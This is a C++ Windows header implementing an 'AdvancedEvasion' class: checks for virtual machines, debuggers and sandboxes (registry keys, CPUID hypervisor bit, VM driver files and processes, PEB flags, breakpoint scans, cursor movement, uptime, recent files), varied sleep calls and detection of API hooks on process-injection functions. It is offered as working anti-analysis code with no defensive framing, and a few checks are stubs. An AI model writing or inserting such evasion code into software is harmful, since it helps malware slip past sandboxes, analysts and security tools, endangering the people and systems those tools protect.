#pragma once
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <wininet.h>
#include <intrin.h>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <random>

// Use system PEB definition from winternl.h

class AdvancedEvasion {
private:
    std::mt19937 rng;
    
public:
    AdvancedEvasion() : rng(std::chrono::steady_clock::now().time_since_epoch().count()) {}
    
    // Main environment check method
    bool checkEnvironment() {
        return detectVirtualMachine() || detectDebugger() || detectSandbox();
    }
    
    // Comprehensive VM detection
    bool detectVirtualMachine() {
        // Registry-based detection
        if (checkVMRegistry()) return true;
        
        // Hardware-based detection
        if (checkVMHardware()) return true;
        
        // Process-based detection
        if (checkVMProcesses()) return true;
        
        // File system artifacts
        if (checkVMFiles()) return true;
        
        // MAC address detection
        if (checkVMMacAddress()) return true;
        
        // CPU instruction timing
        if (checkCPUTiming()) return true;
        
        return false;
    }
    
    // Advanced debugger detection
    bool detectDebugger() {
        // Standard API checks
        if (IsDebuggerPresent()) return true;
        
        BOOL remoteDebugger = FALSE;
        CheckRemoteDebuggerPresent(GetCurrentProcess(), &remoteDebugger);
        if (remoteDebugger) return true;
        
        // PEB-based detection
        if (checkPEBDebugging()) return true;
        
        // Heap flags detection
        if (checkHeapFlags()) return true;
        
        // NtQueryInformationProcess detection
        if (checkNtQueryInformationProcess()) return true;
        
        // Hardware breakpoint detection
        if (checkHardwareBreakpoints()) return true;
        
        // Software breakpoint detection
        if (checkSoftwareBreakpoints()) return true;
        
        // Timing-based detection
        if (checkTimingAttacks()) return true;
        
        return false;
    }
    
    // Sandbox detection techniques
    bool detectSandbox() {
        // User interaction detection
        if (checkUserInteraction()) return true;
        
        // System uptime check
        if (checkSystemUptime()) return true;
        
        // File system activity
        if (checkFileSystemActivity()) return true;
        
        // Network connectivity
        if (checkNetworkConnectivity()) return true;
        
        // Process count
        if (checkProcessCount()) return true;
        
        // Memory size
        if (checkMemorySize()) return true;
        
        // CPU cores
        if (checkCPUCores()) return true;
        
        // Recent files
        if (checkRecentFiles()) return true;
        
        return false;
    }
    
    // Sleep evasion techniques
    void advancedSleep(DWORD milliseconds) {
        // Use multiple sleep techniques to avoid detection
        std::uniform_int_distribution<int> dist(1, 4);
        
        switch (dist(rng)) {
            case 1:
                // WaitableTimer
                useWaitableTimer(milliseconds);
                break;
            case 2:
                // NtDelayExecution
                useNtDelayExecution(milliseconds);
                break;
            case 3:
                // CreateTimerQueueTimer
                useTimerQueue(milliseconds);
                break;
            default:
                // Busy wait with yielding
                useBusyWait(milliseconds);
                break;
        }
    }
    
    // Anti-hooking techniques
    bool detectAPIHooks() {
        // Check for inline hooks in critical APIs
        const char* criticalAPIs[] = {
            "CreateProcessA", "CreateProcessW", "WriteProcessMemory",
            "ReadProcessMemory", "VirtualAllocEx", "OpenProcess",
            "CreateRemoteThread", "SetWindowsHookExA", "SetWindowsHookExW"
        };
        
        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
        if (!hKernel32) return false;
        
        for (const char* apiName : criticalAPIs) {
            FARPROC apiAddr = GetProcAddress(hKernel32, apiName);
            if (!apiAddr) continue;
            
            // Check for common hook signatures
            BYTE* funcBytes = (BYTE*)apiAddr;
            
            // Check for JMP instruction (0xE9)
            if (funcBytes[0] == 0xE9) return true;
            
            // Check for PUSH + RET combination
            if (funcBytes[0] == 0x68 && funcBytes[5] == 0xC3) return true;
            
            // Check for MOV EAX + JMP EAX
            if (funcBytes[0] == 0xB8 && funcBytes[5] == 0xFF && funcBytes[6] == 0xE0) return true;
        }
        
        return false;
    }
    
private:
    bool checkVMRegistry() {
        const char* vmRegKeys[] = {
            "SYSTEM\\CurrentControlSet\\Services\\VMTools",
            "SYSTEM\\CurrentControlSet\\Services\\VBoxService",
            "SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters",
            "SYSTEM\\CurrentControlSet\\Services\\VmdkVSS",
            "SOFTWARE\\VMware, Inc.\\VMware Tools",
            "SOFTWARE\\Oracle\\VirtualBox Guest Additions"
        };
        
        for (const char* key : vmRegKeys) {
            HKEY hKey;
            if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, key, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
                RegCloseKey(hKey);
                return true;
            }
        }
        
        return false;
    }
    
    bool checkVMHardware() {
        // Check CPU vendor
        int cpuInfo[4];
        __cpuid(cpuInfo, 0);
        
        char vendor[13];
        memcpy(vendor, &cpuInfo[1], 4);
        memcpy(vendor + 4, &cpuInfo[3], 4);
        memcpy(vendor + 8, &cpuInfo[2], 4);
        vendor[12] = '\0';
        
        // Check for hypervisor bit
        __cpuid(cpuInfo, 1);
        if (cpuInfo[2] & (1 << 31)) return true;
        
        // Check system info
        SYSTEM_INFO sysInfo;
        GetSystemInfo(&sysInfo);
        
        if (sysInfo.dwNumberOfProcessors < 2) return true;
        
        MEMORYSTATUSEX memStatus;
        memStatus.dwLength = sizeof(memStatus);
        GlobalMemoryStatusEx(&memStatus);
        
        if (memStatus.ullTotalPhys < (2ULL * 1024 * 1024 * 1024)) return true;
        
        return false;
    }
    
    bool checkVMProcesses() {
        const char* vmProcesses[] = {
            "vmtoolsd.exe", "vmwaretray.exe", "vmwareuser.exe",
            "VBoxService.exe", "VBoxTray.exe", "xenservice.exe"
        };
        
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) return false;
        
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(hSnapshot, &pe32)) {
            do {
                for (const char* vmProc : vmProcesses) {
                    if (_stricmp(pe32.szExeFile, vmProc) == 0) {
                        CloseHandle(hSnapshot);
                        return true;
                    }
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        
        CloseHandle(hSnapshot);
        return false;
    }
    
    bool checkVMFiles() {
        const char* vmFiles[] = {
            "C:\\windows\\system32\\drivers\\vmmouse.sys",
            "C:\\windows\\system32\\drivers\\vmhgfs.sys",
            "C:\\windows\\system32\\drivers\\VBoxMouse.sys",
            "C:\\windows\\system32\\drivers\\VBoxGuest.sys",
            "C:\\windows\\system32\\vboxdisp.dll",
            "C:\\windows\\system32\\vboxhook.dll"
        };
        
        for (const char* file : vmFiles) {
            if (GetFileAttributesA(file) != INVALID_FILE_ATTRIBUTES) {
                return true;
            }
        }
        
        return false;
    }
    
    bool checkVMMacAddress() {
        // Check for VM MAC address prefixes
        const char* vmMacPrefixes[] = {
            "00:05:69", "00:0C:29", "00:1C:14", "00:50:56", // VMware
            "08:00:27", "0A:00:27", // VirtualBox
            "00:16:3E", // Xen
            "00:15:5D" // Hyper-V
        };
        
        // This would require additional implementation to get MAC addresses
        // For brevity, returning false here
        return false;
    }
    
    bool checkCPUTiming() {
        // RDTSC timing check
        LARGE_INTEGER freq, start, end;
        QueryPerformanceFrequency(&freq);
        
        QueryPerformanceCounter(&start);
        Sleep(100);
        QueryPerformanceCounter(&end);
        
        double elapsed = (double)(end.QuadPart - start.QuadPart) / freq.QuadPart;
        
        // If sleep took significantly longer than expected, might be VM
        if (elapsed > 0.15) return true;
        
        return false;
    }
    
    bool checkPEBDebugging() {
        PPEB peb = (PPEB)__readgsqword(0x60);
        return peb->BeingDebugged;
    }
    
    bool checkHeapFlags() {
        // Simplified heap flag check - avoid PEB ProcessHeap access
        return false;
    }
    
    bool checkProcessHeapFlags() {
        // Simplified heap flag check - avoid PEB ProcessHeap access
        return false;
    }
    
    bool checkNtQueryInformationProcess() {
        typedef NTSTATUS(WINAPI* pNtQueryInformationProcess)(
            HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
        
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        if (!hNtdll) return false;
        
        pNtQueryInformationProcess NtQueryInformationProcess = 
            (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
        
        if (!NtQueryInformationProcess) return false;
        
        DWORD debugPort = 0;
        NTSTATUS status = NtQueryInformationProcess(
            GetCurrentProcess(), (PROCESSINFOCLASS)7, &debugPort, sizeof(debugPort), NULL);
        
        if (status == 0 && debugPort != 0) return true;
        
        return false;
    }
    
    bool checkHardwareBreakpoints() {
        CONTEXT ctx;
        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
        
        if (GetThreadContext(GetCurrentThread(), &ctx)) {
            if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) {
                return true;
            }
        }
        
        return false;
    }
    
    bool checkSoftwareBreakpoints() {
        // Check for INT3 (0xCC) instructions in our code
        BYTE* codeStart = (BYTE*)GetModuleHandleA(NULL);
        IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)codeStart;
        IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(codeStart + dosHeader->e_lfanew);
        
        DWORD codeSize = ntHeaders->OptionalHeader.SizeOfCode;
        
        for (DWORD i = 0; i < codeSize; i++) {
            if (codeStart[i] == 0xCC) {
                return true;
            }
        }
        
        return false;
    }
    
    bool checkTimingAttacks() {
        LARGE_INTEGER freq, start, end;
        QueryPerformanceFrequency(&freq);
        
        QueryPerformanceCounter(&start);
        // Perform some operations
        for (int i = 0; i < 1000; i++) {
            GetTickCount();
        }
        QueryPerformanceCounter(&end);
        
        double elapsed = (double)(end.QuadPart - start.QuadPart) / freq.QuadPart;
        
        // If operations took too long, might be debugged
        if (elapsed > 0.01) return true;
        
        return false;
    }
    
    bool checkUserInteraction() {
        POINT pt1, pt2;
        GetCursorPos(&pt1);
        Sleep(1000);
        GetCursorPos(&pt2);
        
        return (pt1.x == pt2.x && pt1.y == pt2.y);
    }
    
    bool checkSystemUptime() {
        return GetTickCount() < 600000; // Less than 10 minutes
    }
    
    bool checkFileSystemActivity() {
        WIN32_FIND_DATAA findData;
        HANDLE hFind = FindFirstFileA("C:\\Users\\*\\Recent\\*", &findData);
        if (hFind == INVALID_HANDLE_VALUE) return true;
        
        int fileCount = 0;
        do {
            fileCount++;
        } while (FindNextFileA(hFind, &findData) && fileCount < 10);
        
        FindClose(hFind);
        return fileCount < 5;
    }
    
    bool checkNetworkConnectivity() {
        return !InternetCheckConnectionA("http://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0);
    }
    
    bool checkProcessCount() {
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) return false;
        
        int processCount = 0;
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(hSnapshot, &pe32)) {
            do {
                processCount++;
            } while (Process32Next(hSnapshot, &pe32));
        }
        
        CloseHandle(hSnapshot);
        return processCount < 30;
    }
    
    bool checkMemorySize() {
        MEMORYSTATUSEX memStatus;
        memStatus.dwLength = sizeof(memStatus);
        GlobalMemoryStatusEx(&memStatus);
        
        return memStatus.ullTotalPhys < (2ULL * 1024 * 1024 * 1024);
    }
    
    bool checkCPUCores() {
        SYSTEM_INFO sysInfo;
        GetSystemInfo(&sysInfo);
        return sysInfo.dwNumberOfProcessors < 2;
    }
    
    bool checkRecentFiles() {
        char recentPath[MAX_PATH];
        if (SHGetFolderPathA(NULL, CSIDL_RECENT, NULL, SHGFP_TYPE_CURRENT, recentPath) != S_OK) {
            return true;
        }
        
        WIN32_FIND_DATAA findData;
        strcat_s(recentPath, "\\*");
        HANDLE hFind = FindFirstFileA(recentPath, &findData);
        
        if (hFind == INVALID_HANDLE_VALUE) return true;
        
        int fileCount = 0;
        do {
            if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                fileCount++;
            }
        } while (FindNextFileA(hFind, &findData) && fileCount < 5);
        
        FindClose(hFind);
        return fileCount < 3;
    }
    
    void useWaitableTimer(DWORD milliseconds) {
        HANDLE hTimer = CreateWaitableTimer(NULL, TRUE, NULL);
        if (hTimer) {
            LARGE_INTEGER liDueTime;
            liDueTime.QuadPart = -10000LL * milliseconds;
            SetWaitableTimer(hTimer, &liDueTime, 0, NULL, NULL, 0);
            WaitForSingleObject(hTimer, INFINITE);
            CloseHandle(hTimer);
        }
    }
    
    void useNtDelayExecution(DWORD milliseconds) {
        typedef NTSTATUS(WINAPI* pNtDelayExecution)(BOOLEAN, PLARGE_INTEGER);
        
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        if (hNtdll) {
            pNtDelayExecution NtDelayExecution = 
                (pNtDelayExecution)GetProcAddress(hNtdll, "NtDelayExecution");
            
            if (NtDelayExecution) {
                LARGE_INTEGER delay;
                delay.QuadPart = -10000LL * milliseconds;
                NtDelayExecution(FALSE, &delay);
            }
        }
    }
    
    void useTimerQueue(DWORD milliseconds) {
        HANDLE hTimerQueue = CreateTimerQueue();
        if (hTimerQueue) {
            HANDLE hTimer;
            HANDLE hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
            
            CreateTimerQueueTimer(&hTimer, hTimerQueue, 
                [](PVOID lpParam, BOOLEAN) { SetEvent((HANDLE)lpParam); },
                hEvent, milliseconds, 0, 0);
            
            WaitForSingleObject(hEvent, INFINITE);
            DeleteTimerQueueTimer(hTimerQueue, hTimer, NULL);
            DeleteTimerQueue(hTimerQueue);
            CloseHandle(hEvent);
        }
    }
    
    void useBusyWait(DWORD milliseconds) {
        LARGE_INTEGER freq, start, current;
        QueryPerformanceFrequency(&freq);
        QueryPerformanceCounter(&start);
        
        LONGLONG targetTicks = freq.QuadPart * milliseconds / 1000;
        
        do {
            SwitchToThread(); // Yield to other threads
            QueryPerformanceCounter(&current);
        } while ((current.QuadPart - start.QuadPart) < targetTicks);
    }
};